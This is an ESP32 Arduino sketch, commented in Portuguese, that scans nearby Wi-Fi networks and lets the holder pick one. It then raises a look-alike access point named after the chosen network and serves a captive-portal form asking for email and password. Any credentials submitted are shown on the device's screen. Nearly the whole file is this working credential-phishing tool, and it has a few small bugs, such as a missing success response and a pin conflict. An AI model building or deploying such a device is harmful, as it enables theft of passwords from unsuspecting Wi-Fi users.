#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <TFT_eSPI.h>

#define BUTTON_UP 22
#define BUTTON_DOWN 21
#define BUTTON_SELECT 4

#define TFT_MOSI 23
#define TFT_SCLK 18
#define TFT_CS   -1
#define TFT_DC   17
#define TFT_RST  16
#define TFT_BL   21

#define MAX_REDES 10 // Define o máximo de redes que serão armazenadas
#define NUM_REDES_POR_PAGINA 7 // Número de redes a serem exibidas por página

TFT_eSPI tft = TFT_eSPI();
AsyncWebServer server(80);

String email = "";
String senha = "";
String ssidSelecionado = "";
String macSelecionado = "";
String ipSelecionado = "";

String redes[MAX_REDES]; // Array para armazenar os SSIDs das redes Wi-Fi
int numRedes = 0;
int paginaAtual = 0; // Contador de páginas de redes exibidas
int redeSelecionada = 0; // Índice da rede selecionada na página atual

void setup() {
  Serial.begin(115200);

  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);

  tft.init();
  tft.setRotation(3);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);

  WiFi.mode(WIFI_AP_STA);

  Serial.println("Iniciando o processo de varredura de redes...");
  scanNetworks();
  displayNetworks();
}

void loop() {
  handleButtons();
}

void scanNetworks() {
  Serial.println("Escaneando redes Wi-Fi...");
  numRedes = WiFi.scanNetworks();
  Serial.print("Número de redes encontradas: ");
  Serial.println(numRedes);
  
  for (int i = 0; i < numRedes && i < MAX_REDES; i++) {
    redes[i] = WiFi.SSID(i);
    Serial.print("Rede ");
    Serial.print(i);
    Serial.print(": ");
    Serial.println(redes[i]);
  }
}

void displayNetworks() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);

  int startIndex = paginaAtual * NUM_REDES_POR_PAGINA;
  int endIndex = startIndex + NUM_REDES_POR_PAGINA;
  if (endIndex > numRedes) {
    endIndex = numRedes;
  }

  for (int i = startIndex; i < endIndex; i++) {
    int displayIndex = i - startIndex;
    tft.setCursor(10, displayIndex * 30 + 20);
    if (i == startIndex + redeSelecionada) {
      tft.setTextColor(TFT_RED);
      tft.setTextSize(2);
    } else {
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(2);
    }
    tft.println(redes[i]);
  }

  // Mostra número da página
  tft.setTextSize(1);
  tft.setCursor(10, 200);
  tft.println("Pagina " + String(paginaAtual + 1) + "/" + String((numRedes + NUM_REDES_POR_PAGINA - 1) / NUM_REDES_POR_PAGINA));
}

void handleButtons() {
  if (digitalRead(BUTTON_UP) == LOW) {
    if (redeSelecionada > 0) {
      redeSelecionada--;
    } else if (paginaAtual > 0) {
      paginaAtual--;
      redeSelecionada = NUM_REDES_POR_PAGINA - 1;
    }
    displayNetworks();
    delay(200);
  }
  if (digitalRead(BUTTON_DOWN) == LOW) {
    if (redeSelecionada < NUM_REDES_POR_PAGINA - 1 && (paginaAtual * NUM_REDES_POR_PAGINA + redeSelecionada) < (numRedes - 1)) {
      redeSelecionada++;
    } else if ((paginaAtual + 1) * NUM_REDES_POR_PAGINA < numRedes) {
      paginaAtual++;
      redeSelecionada = 0;
    }
    displayNetworks();
    delay(200);
  }
  if (digitalRead(BUTTON_SELECT) == LOW) {
    int redeAtual = paginaAtual * NUM_REDES_POR_PAGINA + redeSelecionada;
    Serial.println("Rede selecionada: " + redes[redeAtual]);
    ssidSelecionado = redes[redeAtual];
    macSelecionado = WiFi.BSSIDstr(redeAtual);

    // Corrigir a obtenção do IP da rede
    ipSelecionado = "0.0.0.0"; // A variável IP_LOCAL da rede não é válida aqui
    Serial.print("IP Local da Rede: ");
    Serial.println(ipSelecionado);

    displaySelectedNetwork();
    stopCaptivePortal();
    createCaptivePortal(ssidSelecionado);  // Corrigido para criar um AP com um nome diferente
    delay(200);
  }
}

void displaySelectedNetwork() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.println("Rede selecionada:");
  tft.setTextColor(TFT_GREEN);
  tft.setTextSize(3);
  tft.println(ssidSelecionado);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.println("Aguardando informações...");
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.println("MAC: " + macSelecionado);
  tft.println("IP: " + ipSelecionado); // Exibe o IP da rede local
}

void createCaptivePortal(String networkName) {
  Serial.println("Iniciando o processo de criação do AP...");

  String apName = networkName + "_AP";  // Adiciona um sufixo ao nome da rede para o AP
  Serial.print("Criando AP com o nome: ");
  Serial.println(apName);

  // Configuração do AP com um nome único e senha
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  if (!WiFi.softAP(apName.c_str(), "12345678")) {
    Serial.println("Falha ao criar o AP. Verifique a configuração.");
    return;
  }

  Serial.println("AP criado com sucesso.");
  IPAddress IP = WiFi.softAPIP();
  Serial.print("IP do AP: ");
  Serial.println(IP);
  Serial.print("Configurando o servidor HTTP...");
  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<html><body><h2>Captive Portal</h2><form action='/submit' method='post'><label>Email:</label><input type='text' name='email'><br><label>Senha:</label><input type='password' name='senha'><br><input type='submit' value='Enviar'></form></body></html>");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request){
    if(request->hasParam("email", true) && request->hasParam("senha", true)) {
      email = request->getParam("email", true)->value();
      senha = request->getParam("senha", true)->value();
      displaySubmittedInfo();
    } else {
      request->send(400, "text/plain", "Parametros email e senha necessarios");
    }
  });

  server.begin();
  Serial.println("Servidor HTTP iniciado com sucesso.");
  Serial.println("Captive Portal ativo. Acesse o IP do AP para interagir.");
}

void stopCaptivePortal() {
  Serial.println("Parando o Captive Portal...");
  WiFi.softAPdisconnect(true);
  server.end();
  Serial.println("Captive Portal parado.");
}

void displaySubmittedInfo() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.println("Informacoes Submetidas:");
  tft.setTextSize(3);
  tft.setTextColor(TFT_GREEN);
  tft.println("Email:");
  tft.println(email);
  tft.println("Senha:");
  tft.println(senha);
}
